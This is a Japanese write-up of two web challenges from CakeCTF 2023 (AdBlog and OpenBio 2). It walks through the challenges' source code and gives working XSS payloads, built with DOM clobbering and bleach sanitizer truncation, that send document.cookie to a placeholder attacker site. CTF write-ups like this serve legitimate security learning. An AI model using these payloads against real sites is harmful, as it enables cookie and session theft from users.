# CakeCTF 2023 Writeup

CakeCTF 2023（<https://ctftime.org/event/1973/>）に参加しました。  
土, 11 11月 2023, 05:00 UTC — 日, 12 11月 2023, 05:00 UTC

チーム0nePaddingで参加して、724チーム中74位でした。  
参加していた時間が短かったので一問しか解けませんでしたが、面白そうな問題が多そうなので後ほど挑戦したいと思います。  
OpenBio 2は競技後に解きました。

<!-- @import "[TOC]" {cmd="toc" depthFrom=2 depthTo=3 orderedList=false} -->

<!-- code_chunk_output -->

- [[web] AdBlog](#web-adblog)
- [[web] OpenBio 2](#web-openbio-2)

<!-- /code_chunk_output -->

## [web] AdBlog

151point / 39solves

FLAGがクローラのCookieに格納されており、どうにかしてXSSで窃取するという問題でした。  
まず、クローラのソースコードを見ると、ただ単に与えられたURLにアクセスするだけみたいです。  
ありがたいことにCookieのHttpOnlyがfalseになっています。

- crawler/crawler.js

```js:crawler.js
<SNIP>
const crawl = async (target) => {
    const url = `${base_url}/${target}`;
    console.log(`[+] Crawling: ${url}`);

    const browser = await puppeteer.launch(browser_option);
    const page = await browser.newPage();
    try {
        await page.setCookie({
            name: 'flag',
            value: flag,
            domain: new URL(base_url).hostname,
            httpOnly: false,
            secure: false
        });
        await page.goto(url, {
            waitUntil: 'networkidle0',
            timeout: 3 * 1000,
        });
        await page.waitForTimeout(3 * 1000);
    } catch (e) {
        console.log("[-]", e);
    } finally {
        await page.close();
        await browser.close();
    }
}
<SNIP>
```

次に、サーバ側のソースコードを見てみます。

- service/app.py

```python:app.py
<SNIP>
@app.route('/', methods=['GET', 'POST'])
def index():
    if flask.request.method == 'GET':
        return flask.render_template("index.html")

    blog_id = os.urandom(32).hex()
    title = flask.request.form.get('title', 'untitled')
    content = flask.request.form.get('content', '<i>empty post</i>')
    if len(title) > 128 or len(content) > 1024*1024:
        return flask.render_template("index.html",
                                     msg="Too long title or content.")

    db().set(blog_id, json.dumps({'title': title, 'content': content}))
    return flask.redirect(f"/blog/{blog_id}")

@app.route('/blog/<blog_id>')
def blog(blog_id):
    if not re.match("^[0-9a-f]{64}$", blog_id):
        return flask.redirect("/")

    blog = db().get(blog_id)
    if blog is None:
        return flask.redirect("/")

    blog = json.loads(blog)
    title = blog['title']
    content = base64.b64encode(blog['content'].encode()).decode()
    return flask.render_template("blog.html", title=title, content=content)
<SNIP>
```

ブログの投稿や確認ができるようですが、特に気になる処理はなさそうです。  
base64のエンコード/デコード処理が少し気になるぐらいです。

最後に、ブログの確認画面のソースコードを見てみます。

- service/templates/blog.html

```html:blog.html
<SNIP>
<script src="/static/js/ads.js"></script>
<script>
  let content = DOMPurify.sanitize(atob("{{ content }}"));
  document.getElementById("content").innerHTML = content;

  window.onload = async () => {
    if (await detectAdBlock()) {
      showOverlay = () => {
        document.getElementById("ad-overlay").style.width = "100%";
      };
    }

    if (typeof showOverlay === 'undefined') {
      document.getElementById("ad").style.display = "block";
    } else {
      setTimeout(showOverlay, 1000);
    }
  }
</script>
<SNIP>
```

ついでにads.jsも。

- service/static/js/ads.js

```js:ads.js
const ADS_URL = 'https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js';

async function detectAdBlock(callback) {
    try {
        let res = await fetch(ADS_URL, { method: 'HEAD' });
        return res.status !== 200;
    } catch {
        return true;
    }
}
```

どうやら、`ads.js`でアドブロックが有効かどうかを判定して、有効なら`ad-overlay`を表示するようです。

入力値のcontentはDOMPurifyでサニタイズされているので、通常のXSSはできなそうです。  
ただし、一部のタグは入れられるので、DOM Clobberingして`setTimeout(showOverlay, 1000)`でスクリプトを動作させられれば良さそうです。

ここまではすぐわかったのですが、どんな入力値にすればスクリプトが動作するかわかりませんでした。  
仕方なく`DOM Clobbering setTimeout`でググってみると、以下の記事が見つかりました。

- <https://terjanq.medium.com/clobbering-the-clobbered-vol-2-fb199ad7ec41>

cidを使えば良いようです。（この挙動はなかなか面白いですね。）  
contentに以下の値を入れてブログを投稿し、クローラにアクセスさせるとFLAGが得られました。

```text
<a id=showOverlay href="cid:location='https://<your.site>/'+document.cookie"></a>
```

- FLAG

```text
CakeCTF{setTimeout_3v4lu4t3s_str1ng_4s_a_j4va5cr1pt_c0de}
```

## [web] OpenBio 2

200point / 21solves

[[web] AdBlog](#web-adblog)と似たような問題で、こちらもFLAGがクローラのCookieに格納されており、どうにかしてXSSで窃取するという問題でした。  
ソースコードはほぼ同じようだったので、関係がある部分のみ抜粋します。

- srvice/app.py

```python:app.py
<SNIP>
@app.route('/', methods=['GET', 'POST'])
def index():
    if flask.request.method == 'GET':
        return flask.render_template("index.html")

    err = None
    bio_id = os.urandom(32).hex()
    name = flask.request.form.get('name', 'Anonymous')
    email = flask.request.form.get('email', '')
    bio1 = flask.request.form.get('bio1', '')
    bio2 = flask.request.form.get('bio2', '')
    if len(name) > 20:
        err = "Name is too long"
    elif len(email) > 40:
        err = "Email is too long"
    elif len(bio1) > 1001 or len(bio2) > 1001:
        err = "Bio is too long"

    if err:
        return flask.render_template("index.html", err=err)

    db().set(bio_id, json.dumps({
        'name': name, 'email': email, 'bio1': bio1, 'bio2': bio2
    }))
    return flask.redirect(f"/bio/{bio_id}")

@app.route('/bio/<bio_id>')
def bio(bio_id):
    if not re.match("^[0-9a-f]{64}$", bio_id):
        return flask.redirect("/")

    bio = db().get(bio_id)
    if bio is None:
        return flask.redirect("/")

    bio = json.loads(bio)
    name = bio['name']
    email = bio['email']
    bio1 = bleach.linkify(bleach.clean(bio['bio1'], strip=True))[:10000]
    bio2 = bleach.linkify(bleach.clean(bio['bio2'], strip=True))[:10000]
    return flask.render_template("bio.html",
                                 name=name, email=email, bio1=bio1, bio2=bio2)
<SNIP>
```

- service/templates/bio.html

```html:bio.html
<!DOCTYPE html>
<html>
  <head>
    <title>{{ name }}'s Bio</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/skeleton/2.0.4/skeleton.min.css">
  </head>
  <body>
    <div class="container" style="margin-top: 4em;">
      <h4>{{ name }}'s Biography</h4>
      <div id="bio">{{ bio1 | safe }}{{ bio2 | safe }}</div>
      {% if email %}<hr><p>Contact: <a href="mailto:{{ email }}">{{email}}</a></p>{% endif %}
    </div>
  </body>
</html>
```

bio1とbio2が明らかに怪しく、bio.htmlのテンプレートではタグがそのまま出力されるようです。  
ただし、出力前にbio1とbio2はbleachでサニタイズされています。  
ここで気になる点は3点。

1. bleach.cleanされた後に、bleach.linkifyされている。
1. bleach処理後に10000文字に切り詰められている。
1. bio1とbio2の2つの入力があり、連結されて出力される。

```python
bio1 = bleach.linkify(bleach.clean(bio['bio1'], strip=True))[:10000]
bio2 = bleach.linkify(bleach.clean(bio['bio2'], strip=True))[:10000]
```

1点目は2重エスケープ問題とかがあるのかなと思いましたが、ゼロデイの脆弱性がない限りは特に問題はなさそうな気がします。  
とすると、2点目と3点目を使うのかなという考えになります。  
bio1がbleachでサニタイズされた後の10000文字目に`<`が来るようにできれば、10001文字目以降は切り捨てられるので、bio2の入力を`img src=a onerror=...`のようにして結合させることでXSSができそうです。

後は、bio1とbio2の1001文字以下という制限をどうにかできれば良さそうです。  
具体的には、1文字あたり変換後に10文字以上になっている必要があります。

試しに`a.jp`（4文字）を入れると、bleach.linkifyによって`<a href="http://a.jp" rel="nofollow">a.jp</a>`（45文字）に変換されるのでかなり使えそうです。

（～競技中はここまでで時間切れ～）

残りは1文字で変換後に5文字になる文字があれば良いのですが、`<`だと`&lt;`で4文字。  
いろいろ試したところ、`&`が`&amp;`で5文字になることがわかりました。

後は組み立てて、クローラにアクセスさせるだけです。  
（といいつつ、組み立てるのに結構手間どりました。文字数がぎりぎりで閉じタグ`</a>`の`<`を使う発想がすぐに出てこなかったためです。）

- bio1

```text
<<a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp&a.jp
```

- bio2

```text
img src=a onerror="location='https://<your>'+'.<site>/'+document.cookie"
```

送信先URLを区切ることで、bleach.linkifyによってリンクにされるのを防いでいます。  
bio2の方はタグを閉じなくてもブラウザがよしなにしてくれるので、これで問題無かったです。  
ちなみに、bleach.linkifyでは、ハードコードされているTLDの場合のみリンクになるようです。  
<https://github.com/mozilla/bleach/blob/main/bleach/linkifier.py#L13>

- FLAG

```text
CakeCTF{d0n'7_m0d1fy_4ft3r_s4n1tiz3}
```
